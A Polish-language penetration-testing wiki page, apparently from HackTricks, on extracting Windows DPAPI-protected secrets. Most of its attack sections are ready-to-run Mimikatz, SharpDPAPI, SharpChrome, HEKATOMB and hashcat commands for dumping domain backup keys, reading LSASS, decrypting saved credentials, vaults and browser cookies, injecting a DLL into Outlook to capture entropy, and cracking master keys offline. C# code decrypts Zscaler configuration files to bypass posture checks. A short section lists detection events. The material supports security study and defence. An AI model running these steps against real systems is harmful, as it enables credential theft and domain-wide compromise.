# DPAPI - Ekstrakcja haseł

{{#include ../../banners/hacktricks-training.md}}



## Co to jest DPAPI

The Data Protection API (DPAPI) jest wykorzystywane w systemie Windows głównie do **symetrycznego szyfrowania kluczy prywatnych asymetrycznych**, wykorzystując jako istotne źródło entropii sekrety użytkownika lub systemu. Podejście to upraszcza szyfrowanie dla deweloperów, pozwalając im szyfrować dane przy użyciu klucza pochodzącego z sekretów logowania użytkownika lub, w przypadku szyfrowania systemowego, z sekretów uwierzytelniania domeny systemu, dzięki czemu deweloperzy nie muszą sami zarządzać ochroną klucza szyfrującego.

Najczęstszym sposobem użycia DPAPI są funkcje **`CryptProtectData` i `CryptUnprotectData`**, które pozwalają aplikacjom na bezpieczne szyfrowanie i odszyfrowywanie danych w kontekście sesji aktualnie zalogowanego procesu. Oznacza to, że zaszyfrowane dane mogą być odszyfrowane tylko przez tego samego użytkownika lub system, który je zaszyfrował.

Dodatkowo te funkcje akceptują również **`entropy` parameter**, który będzie użyty podczas szyfrowania i odszyfrowywania, dlatego aby odszyfrować coś zaszyfrowanego z użyciem tego parametru, musisz dostarczyć tę samą wartość entropii, która była użyta podczas szyfrowania.

### Generowanie klucza użytkownika

DPAPI generuje unikalny klucz (zwany **`pre-key`**) dla każdego użytkownika na podstawie jego poświadczeń. Klucz ten jest pochodną hasła użytkownika i innych czynników, a algorytm zależy od typu użytkownika, ale końcowo jest to SHA1. Na przykład, dla użytkowników domenowych, **zależy od NTLM hash użytkownika**.

To jest szczególnie interesujące, ponieważ jeśli attacker może uzyskać hash hasła użytkownika, może:

- **Decrypt any data that was encrypted using DPAPI** z użyciem klucza tego użytkownika bez potrzeby kontaktowania się z API
- Spróbować **crack the password** offline, próbując wygenerować prawidłowy DPAPI key

Ponadto za każdym razem, gdy użytkownik szyfruje dane przy użyciu DPAPI, generowany jest nowy **master key**. Ten master key jest faktycznie używany do szyfrowania danych. Każdemu master key przypisany jest **GUID** (Globally Unique Identifier), który go identyfikuje.

Master keys są przechowywane w katalogu **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**, gdzie `{SID}` jest Security Identifier tego użytkownika. Master key jest przechowywany zaszyfrowany przez użytkownika **`pre-key`** oraz także przez **domain backup key** do celów odzyskiwania (więc ten sam klucz jest przechowywany zaszyfrowany 2 razy dwiema różnymi metodami).

Zauważ, że **domain key użyty do zaszyfrowania master key znajduje się na domain controllers i nigdy się nie zmienia**, więc jeśli attacker ma dostęp do domain controller, może odzyskać domain backup key i odszyfrować master keys wszystkich użytkowników w domenie.

Zaszyfrowane bloby zawierają w nagłówkach **GUID master key**, który został użyty do zaszyfrowania danych wewnątrz.

> [!TIP]
> DPAPI encrypted blobs starts with **`01 00 00 00`**

Find master keys:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
This is what a bunch of Master Keys of a user will looks like:

![](<../../images/image (1121).png>)

### Machine/System key generation

This is key used for the machine to encrypt data. It's based on the **DPAPI_SYSTEM LSA secret**, which is a special key that only the SYSTEM user can access. This key is used to encrypt data that needs to be accessible by the system itself, such as machine-level credentials or system-wide secrets.

Note that these keys **nie mają kopii zapasowej domeny** so they are only accesisble locally:

- **Mimikatz** can access it dumping LSA secrets using the command: `mimikatz lsadump::secrets`
- The secret is stored inside the registry, so an administrator could **zmodyfikować uprawnienia DACL, aby uzyskać do niego dostęp**. The registry path is: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`


### Protected Data by DPAPI

Among the personal data protected by DPAPI are:

- Windows creds
- Internet Explorer and Google Chrome's passwords and auto-completion data
- E-mail and internal FTP account passwords for applications like Outlook and Windows Mail
- Passwords for shared folders, resources, wireless networks, and Windows Vault, including encryption keys
- Passwords for remote desktop connections, .NET Passport, and private keys for various encryption and authentication purposes
- Network passwords managed by Credential Manager and personal data in applications using CryptProtectData, such as Skype, MSN messenger, and more
- Encrypted blobs inside the register
- ...

System protected data includes:
- Wifi passwords
- Scheduled task passwords
- ...

### Master key extraction options

- If the user has domain admin privileges, they can access the **domain backup key** to decrypt all user master keys in the domain:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Mając uprawnienia administratora lokalnego, można **uzyskać dostęp do pamięci LSASS** w celu wyodrębnienia kluczy głównych DPAPI wszystkich zalogowanych użytkowników oraz klucza SYSTEM.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Jeśli użytkownik ma uprawnienia administratora lokalnego, może uzyskać dostęp do **DPAPI_SYSTEM LSA secret**, aby odszyfrować klucze główne maszyny:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- Jeśli hasło lub hash NTLM użytkownika jest znane, możesz **bezpośrednio odszyfrować klucze główne użytkownika**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Jeśli jesteś w sesji jako user, możliwe jest poproszenie DC o **backup key to decrypt the master keys using RPC**. Jeśli jesteś local admin i user jest zalogowany, możesz w tym celu **steal his session token**:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Wyświetl Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Uzyskaj dostęp do zaszyfrowanych danych DPAPI

### Znajdź zaszyfrowane dane DPAPI

Typowe **chronione pliki** użytkownika znajdują się w:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Sprawdź także zamianę `\Roaming\` na `\Local\` w powyższych ścieżkach.

Enumeration examples:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) może znaleźć zaszyfrowane DPAPI bloby w systemie plików, rejestrze i w blobach B64:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Zauważ, że [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (z tego samego repo) może być użyty do odszyfrowania wrażliwych danych przy użyciu DPAPI, takich jak cookies.

### Klucze dostępu i dane

- **Użyj SharpDPAPI** aby pobrać poświadczenia z plików zaszyfrowanych DPAPI z bieżącej sesji:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Pobierz informacje o credentials** takie jak zaszyfrowane dane i guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Access masterkeys**:

Odszyfruj masterkey użytkownika żądającego **domain backup key** przy użyciu RPC:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
Narzędzie **SharpDPAPI** obsługuje także następujące argumenty do odszyfrowania klucza głównego (zwróć uwagę, że można użyć `/rpc`, aby uzyskać klucz kopii zapasowej domeny, `/password`, aby użyć hasła w postaci jawnej, lub `/pvk`, aby wskazać plik prywatnego klucza domeny DPAPI...):
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Odszyfruj dane przy użyciu masterkey**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
Narzędzie **SharpDPAPI** obsługuje także te argumenty do deszyfrowania `credentials|vaults|rdg|keepass|triage|blob|ps` (zauważ, że można użyć `/rpc`, aby uzyskać klucz kopii zapasowej domeny, `/password`, aby użyć hasła jawnego, `/pvk`, aby wskazać plik prywatnego klucza domeny DPAPI, `/unprotect`, aby użyć bieżącej sesji użytkownika...):
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Odszyfruj dane przy użyciu **bieżącej sesji użytkownika**:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
### Obsługa opcjonalnej entropii ("entropia osób trzecich")

Niektóre aplikacje przekazują dodatkową wartość **entropii** do `CryptProtectData`. Bez tej wartości blob nie może zostać odszyfrowany, nawet jeśli znany jest poprawny masterkey. Uzyskanie tej entropii jest zatem niezbędne przy atakowaniu poświadczeń chronionych w ten sposób (np. Microsoft Outlook, niektóre klienty VPN).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) to DLL w trybie użytkownika, który hookuje funkcje DPAPI wewnątrz procesu docelowego i przejrzyście zapisuje każdą dostarczoną opcjonalną entropię. Uruchomienie EntropyCapture w trybie **DLL-injection** przeciwko procesom takim jak `outlook.exe` lub `vpnclient.exe` spowoduje wygenerowanie pliku mapującego każdy bufor entropii do wywołującego procesu i blobu. Przechwyconą entropię można później przekazać do **SharpDPAPI** (`/entropy:`) lub **Mimikatz** (`/entropy:<file>`) w celu odszyfrowania danych.
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Łamanie masterkeys offline (Hashcat & DPAPISnoop)

Microsoft wprowadził format masterkey **context 3** zaczynając od Windows 10 v1607 (2016). `hashcat` v6.2.6 (December 2023) dodał hash-modes **22100** (DPAPI masterkey v1 context), **22101** (context 1) i **22102** (context 3), umożliwiając GPU-przyspieszone łamanie haseł użytkowników bezpośrednio z pliku masterkey. W związku z tym atakujący mogą przeprowadzać word-list lub brute-force bez interakcji z systemem docelowym.

`DPAPISnoop` (2024) automatyzuje ten proces:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
Narzędzie może również parsować Credential and Vault blobs, odszyfrowywać je przy użyciu złamanych kluczy i eksportować hasła w postaci jawnej.

### Dostęp do danych innej maszyny

W **SharpDPAPI and SharpChrome** możesz wskazać opcję **`/server:HOST`**, aby uzyskać dostęp do danych zdalnej maszyny. Oczywiście musisz mieć dostęp do tej maszyny, a w poniższym przykładzie zakłada się, że znany jest **domain backup encryption key**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Inne narzędzia

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) to narzędzie automatyzujące ekstrakcję wszystkich użytkowników i komputerów z katalogu LDAP oraz ekstrakcję klucza kopii zapasowej kontrolera domeny przez RPC. Skrypt następnie rozwiązuje adresy IP wszystkich komputerów i wykonuje smbclient na wszystkich maszynach, aby pobrać wszystkie DPAPI blobs wszystkich użytkowników i odszyfrować wszystko przy użyciu klucza kopii zapasowej kontrolera domeny.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Z listy komputerów wyciągniętej z LDAP możesz odkryć każdą podsieć, nawet jeśli jej wcześniej nie znałeś!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) potrafi automatycznie zrzucać sekrety chronione przez DPAPI. W wydaniu 2.x wprowadzono:

* Równoległe zbieranie blobów z setek hostów
* Parsowanie masterkeyów **context 3** oraz automatyczna integracja z Hashcat do łamania
* Wsparcie dla Chrome "App-Bound" zaszyfrowanych ciasteczek (zobacz następny rozdział)
* Nowy tryb **`--snapshot`** do cyklicznego sondowania endpointów i porównywania (diff) nowo utworzonych blobów

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) to parser w C# dla plików masterkey/credential/vault, który potrafi generować formaty dla Hashcat/JtR i opcjonalnie automatycznie uruchamiać łamanie. W pełni wspiera formaty masterkeyów maszynowych i użytkownika aż do Windows 11 24H1.


## Typowe wykrycia

- Dostęp do plików w `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` i innych katalogach związanych z DPAPI.
- Szczególnie z udostępnienia sieciowego takiego jak **C$** lub **ADMIN$**.
- Użycie **Mimikatz**, **SharpDPAPI** lub podobnych narzędzi do dostępu do pamięci LSASS lub zrzutu masterkeyów.
- Zdarzenie **4662**: *Operacja została wykonana na obiekcie* – może być skorelowane z dostępem do obiektu **`BCKUPKEY`**.
- Zdarzenie **4673/4674** gdy proces żąda *SeTrustedCredManAccessPrivilege* (Credential Manager)

---
### 2023-2025 luki i zmiany w ekosystemie

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (listopad 2023). Atakujący z dostępem do sieci mógł nakłonić członka domeny do pobrania złośliwego klucza kopii zapasowej DPAPI, co umożliwiało odszyfrowanie user masterkeyów. Załatano to w listopadowej aktualizacji zbiorczej 2023 – administratorzy powinni upewnić się, że DC i stacje robocze są w pełni załatane.
* **Chrome 127 “App-Bound” cookie encryption** (lipiec 2024) zastąpiło legacy ochronę opartą wyłącznie na DPAPI dodatkowym kluczem przechowywanym w **Credential Manager** użytkownika. Offline odszyfrowanie ciasteczek teraz wymaga zarówno DPAPI masterkey, jak i **GCM-wrapped app-bound key**. SharpChrome v2.3 i DonPAPI 2.x potrafią odzyskać dodatkowy klucz, gdy działają w kontekście użytkownika.


### Studium przypadku: Zscaler Client Connector – niestandardowa entropia pochodząca od SID

Zscaler Client Connector przechowuje kilka plików konfiguracyjnych w `C:\ProgramData\Zscaler` (np. `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Każdy plik jest zaszyfrowany przy użyciu **DPAPI (Machine scope)**, ale dostawca dostarcza **custom entropy**, która jest *obliczana w czasie wykonywania* zamiast być zapisana na dysku.

Entropia jest odtwarzana z dwóch elementów:

1. Twardo zakodowany sekret osadzony w `ZSACredentialProvider.dll`.
2. The **SID** of the Windows account the configuration belongs to.

Algorytm implementowany przez DLL jest równoważny:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
Ponieważ sekret jest osadzony w DLL, który można odczytać z dysku, **każdy lokalny atakujący z uprawnieniami SYSTEM może odtworzyć entropię dla dowolnego SID** i odszyfrować bloby offline:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
Deszyfrowanie zwraca kompletną konfigurację JSON, zawierającą wszystkie **kontrole stanu urządzenia** oraz ich oczekiwane wartości – informacje bardzo przydatne przy próbach obejścia po stronie klienta.

> WSKAZÓWKA: pozostałe zaszyfrowane artefakty (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) są chronione przez DPAPI **bez** entropii (`16` bajtów zerowych). Mogą więc zostać odszyfrowane bezpośrednio za pomocą `ProtectedData.Unprotect` po uzyskaniu uprawnień SYSTEM.

## Źródła

- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)

- [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [https://github.com/Leftp/DPAPISnoop](https://github.com/Leftp/DPAPISnoop)
- [https://pypi.org/project/donpapi/2.0.0/](https://pypi.org/project/donpapi/2.0.0/)

{{#include ../../banners/hacktricks-training.md}}
